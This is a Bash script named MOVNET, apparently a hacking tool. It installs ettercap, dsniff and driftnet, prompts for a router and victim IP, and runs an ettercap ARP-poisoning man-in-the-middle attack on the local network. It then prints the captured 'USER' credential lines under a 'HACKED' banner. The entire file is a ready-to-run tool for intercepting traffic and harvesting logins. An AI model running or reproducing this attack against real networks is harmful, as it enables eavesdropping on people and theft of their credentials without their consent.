#!/bin/bash
#--------------------------------------------------------------------------------------------------------------
                            #Verificação do privilégio do user

[ $(id -u) -ne 0 ] && { echo -e "Do you not root"; sudo ./movnet.sh; exit ;} || echo -e "I'm root!"
#--------------------------------------------------------------------------------------------------------------
                           #verificação de pacotes para instalação


echo -e "Analyzing packages...\n"
pacote=$(dpkg --get-selections | grep ettercap-text-only )
if [ -n "$pacote" ] ;
  sleep 1
 then
     echo -e "Ettercap -------------------------------------- OK\n"
 else
     echo -e "Ettercap ----------------------------- Nao instalado\n"
     echo "A aplicação ettercap-text-only será instalado, tecle [ENTER] para continuar."
     read
     apt-get install ettercap-text-only
fi
pacote=$(dpkg --get-selections | grep dsniff )
if [ -n "$pacote" ] ;
 then
     echo -e "Urlsnarf -------------------------------------- OK\n"
 else 
     echo -e "Urlsnarf ----------------------------- Nao instalado\n"
     echo "A aplicação Urlsnarf será instalado, tecle [ENTER] para continuar."
     read
     apt-get install dsniff
fi
pacote=$(dpkg --get-selections | grep driftnet ) 
if [ -n "$pacote" ] ;
 then
     echo -e "Driftnet -------------------------------------- OK\n"
 else
     echo -e "Driftnet ----------------------------- Nao instalado\n"
     echo "A aplicação Driftnet será instalado, tecle [ENTER] para continuar."
     read
     apt-get install driftnet
fi
pacote=$(dpkg --get-selections | grep figlet )
if [ -n "$pacote" ] ;
 then 
     echo -e "Figlet ---------------------------------------- OK\n"
 else
     echo -e "Figlet ----------------------------- Nao instalado\n"
     echo "A aplicação Figlet será instalado, tecle [ENTER] para continuar."
     read
     apt-get install figlet
fi
clear

#--------------------------------------------------------------------------------------------------------------
                                #inicio da coleta de dados

sleep 1
figlet "         MOVNET"
echo "                Movement On network"
echo -e "Dev: github.com/shskull\n"
echo "------------------------------------------"
    echo
    echo -n "Find the IP of the target router, y/n? "
read v0
if [ "$v0" = y ] ;
 then 
    route
    echo "------------------------------------------"
    echo
    echo "Enter the target IP."
    echo -n ">> " ;read IP
    echo "------------------------------------------"
    echo
    else
    echo
    echo "------------------------------------------"
   echo "Enter the target IP"
    echo -n ">> " ;read IP
    echo "------------------------------------------"
    echo
 fi    
    echo
    echo "Enter the network interface used"
    ip -br link | awk '{print "iface: "$1}'
    echo -n ">> " ;read ith
    echo "------------------------------------------"
    echo -n "Insert target host, y/n? "
    read target
    clear


#--------------------------------------------------------------------------------------------------------------
                                      #TARGET=YES

 if [[ "$target" = y ]]; then
    echo -n ">> " ; read alvo
    ./tools.sh&
    xterm -e ./target.sh&
    clear
    figlet "         MOVNET"
echo "                Movement On network"
echo -e "Dev: @corjacrew\n"
echo -e "***********************************************************"
echo -e "*                                                         *"
echo -e "*              Press CTRL+C to stop!                      *"
echo -e "*                                                         *"
echo -e "***********************************************************"
    ettercap -T -q -i $ith -M arp:remote /$IP/$alvo/ > logs/ettercap.log
#--
kill $(ps aux | grep urlsnarf | cut -d" " -f6)
sleep 1
    clear
figlet "         MOVNET"
echo "                Movement On network"
echo -e "Dev: @corjacrew\n"
echo -e "***********************************************************"
echo -e "*                        HACKED                           *"
echo -e "***********************************************************"
cat logs/ettercap.log | grep USER
exit

#--------------------------------------------------------------------------------------------------------------
                                      #TARGET=NO

 elif [[ "$target" = n ]]; then
    ./tools.sh&
    xterm -e ./target.sh&
    clear
    figlet "         MOVNET"
echo "                Movement On network"
echo -e "Dev: @corjacrew\n"
echo -e "***********************************************************"
echo -e "*                                                         *"
echo -e "*              Press CTRL+C to stop!                      *"
echo -e "*                                                         *"
echo -e "***********************************************************"
    ettercap -T -q -i $ith -M arp:remote /$IP// > logs/ettercap.log
#--
kill $(ps aux | grep urlsnarf | cut -d" " -f6)
sleep 1
    clear
figlet "         MOVNET"
echo "                Movement On network"
echo -e "Dev: @corjacrew\n"
echo -e "***********************************************************"
echo -e "*                        HACKED                           *"
echo -e "***********************************************************"
cat logs/ettercap.log | grep USER
exit

#------
 else
  echo "------------------------------------------"
  echo "Unknown entry, run the script again. y/n?"
  echo -n ">> " ; read v1
  if [[ "$v1" = y ]]; then
    ./movnet.sh
else
  exit
fi
fi
